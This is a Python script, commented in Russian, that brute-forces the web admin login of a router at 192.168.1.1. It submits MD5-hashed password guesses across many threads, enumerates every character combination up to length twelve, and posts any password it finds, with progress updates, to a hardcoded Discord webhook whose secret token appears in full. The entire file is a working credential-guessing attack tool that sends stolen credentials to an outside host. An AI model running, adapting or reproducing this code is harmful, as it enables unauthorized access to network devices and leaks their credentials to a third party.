import requests
import hashlib
import itertools
import string
import time
import sys
import threading
from queue import Queue
import os
from urllib.parse import urlparse
import multiprocessing

def clear_console():
    """Очищает консоль в зависимости от операционной системы"""
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Linux/Mac
        os.system('clear')

def send_discord_notification(password, login):
    """Отправляет уведомление в Discord о найденном пароле"""
    webhook_url = "https://discord.com/api/webhooks/1428727732602409022/nftibkHgIWOu4wxUejniVW8anJtGjdLUWFUuKl5an1jWxOJZmU2EvuvgLEEbwkwloFNL"
    
    message = {
        "content": f"<@910939297950097499> KEY FOUND! Password for {login}: {password}",
        "username": "BruteForce Bot",
        "embeds": [
            {
                "title": "Password Found!",
                "description": f"**Login**: {login}\n**Password**: {password}",
                "color": 65280,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message, timeout=5)
    except Exception as e:
        print(f"Failed to send Discord notification: {e}")

def send_discord_length_notification(length):
    """Отправляет уведомление в Discord о смене длины пароля"""
    webhook_url = "https://discord.com/api/webhooks/1428727732602409022/nftibkHgIWOu4wxUejniVW8anJtGjdLUWFUuKl5an1jWxOJZmU2EvuvgLEEbwkwloFNL"
    
    message = {
        "content": f"Testing length {length}",
        "username": "BruteForce Bot",
        "embeds": [
            {
                "title": "Length Changed",
                "description": f"Now testing passwords with length {length}",
                "color": 16753920,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message, timeout=5)
    except Exception as e:
        print(f"Failed to send Discord length notification: {e}")

def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

class MaxPerformanceBruteforcer:
    def __init__(self, base_url, login):
        parsed = urlparse(base_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.login = login
        self.found_password = None
        self.lock = threading.Lock()
        self.tested = 0
        self.start_time = time.time()
        self.current_password = ""
        self.chars = string.digits + string.ascii_letters + string.punctuation
        self.max_length = 12
        
        # Используем все доступные ядра CPU
        self.num_threads = multiprocessing.cpu_count() * 4  # Гипертрединг
        print(f"Using {self.num_threads} threads (CPU cores: {multiprocessing.cpu_count()})")
        
        # Повышаем приоритет процесса (работает на Linux/Unix)
        try:
            os.nice(-20)  # Максимальный приоритет
        except:
            pass

    def worker(self, password_queue, session):
        """Рабочий поток для проверки паролей"""
        while not self.found_password:
            try:
                # Берем несколько паролей за раз для уменьшения блокировок
                passwords = []
                for _ in range(10):
                    password = password_queue.get_nowait()
                    passwords.append(password)
            except:
                time.sleep(0.001)  # Минимальная задержка
                continue
            
            for password in passwords:
                if self.found_password:
                    break
                    
                # Обновляем текущий пароль для отображения
                with self.lock:
                    self.current_password = password
                    self.tested += 1
                
                data = {
                    'usernameEncrypt': md5_hash(self.login),
                    'passwordEncrypt': md5_hash(password),
                    'submit.htm?login.htm': 'Send'
                }
                
                try:
                    # Агрессивные таймауты для максимальной скорости
                    response = session.post(f"{self.base_url}/login.cgi", 
                                          data=data, 
                                          timeout=0.5,
                                          headers={'Connection': 'close'})
                    if 'Username or password error' not in response.text:
                        with self.lock:
                            self.found_password = password
                        send_discord_notification(password, self.login)
                        return
                except:
                    pass
                
                password_queue.task_done()

    def progress_monitor(self, total_combinations, length):
        """Монитор прогресса с минимальными задержками"""
        last_update = 0
        while not self.found_password and self.tested < total_combinations:
            current_time = time.time()
            # Обновляем прогресс только каждые 0.5 секунд для экономии ресурсов
            if current_time - last_update > 0.5:
                elapsed = current_time - self.start_time
                speed = self.tested / elapsed if elapsed > 0 else 0
                
                if speed > 0:
                    time_left = (total_combinations - self.tested) / speed
                    eta_str = time.strftime('%H:%M:%S', time.gmtime(time_left))
                else:
                    eta_str = '?'
                
                progress = (self.tested / total_combinations) * 100
                
                status_line = f"[{time.strftime('%H:%M:%S', time.gmtime(elapsed))}] {self.tested}/{total_combinations} keys tested ({speed:.0f} k/s) | ETA: {eta_str} | Current: '{self.current_password}' | {progress:.2f}% | Length: {length}"
                sys.stdout.write(f"\r{status_line}")
                sys.stdout.flush()
                last_update = current_time
            
            time.sleep(0.01)  # Минимальная задержка

    def brute_force_password(self):
        """Основная функция подбора с максимальной производительностью"""
        
        for length in range(1, self.max_length + 1):
            if self.found_password:
                break
                
            total_combinations = len(self.chars) ** length
            print(f"Testing length {length}")
            send_discord_length_notification(length)
            
            # Создаем очередь и потоки
            password_queue = Queue(maxsize=10000)  # Большой размер очереди
            threads = []
            
            # Создаем отдельные сессии для каждого потока
            sessions = [requests.Session() for _ in range(self.num_threads)]
            
            # Запускаем рабочие потоки
            for i in range(self.num_threads):
                t = threading.Thread(target=self.worker, args=(password_queue, sessions[i]))
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Запускаем монитор прогресса
            progress_thread = threading.Thread(target=self.progress_monitor, args=(total_combinations, length))
            progress_thread.daemon = True
            progress_thread.start()
            
            # Быстро заполняем очередь паролями
            batch = []
            for candidate in itertools.product(self.chars, repeat=length):
                if self.found_password:
                    break
                batch.append(''.join(candidate))
                # Добавляем пачками для эффективности
                if len(batch) >= 100:
                    for password in batch:
                        try:
                            password_queue.put(password, block=False)
                        except:
                            time.sleep(0.001)
                    batch = []
            
            # Добавляем оставшиеся пароли
            for password in batch:
                if self.found_password:
                    break
                try:
                    password_queue.put(password, block=False)
                except:
                    time.sleep(0.001)
            
            # Ждем завершения с таймаутом
            start_wait = time.time()
            while not password_queue.empty() and not self.found_password:
                if time.time() - start_wait > 300:  # Таймаут 5 минут на длину
                    break
                time.sleep(0.1)
            
            if self.found_password:
                print(f"\n\nKEY FOUND! [ {self.found_password} ]")
                return self.found_password
        
        return None

# Очищаем консоль перед запуском
clear_console()

# Использование:
base_url = "http://192.168.1.1/login.htm"
login = "admin"
print("Starting MAX PERFORMANCE brute force attack...")
print("Using all available system resources")
print("=" * 60)

# Предварительный прогрев (оптимизация Python)
print("Optimizing system performance...")

bruteforcer = MaxPerformanceBruteforcer(base_url, login)
password = bruteforcer.brute_force_password()

if password:
    print(f"\nPassword for {login}: {password}")
else:
    print("\nPassword not found")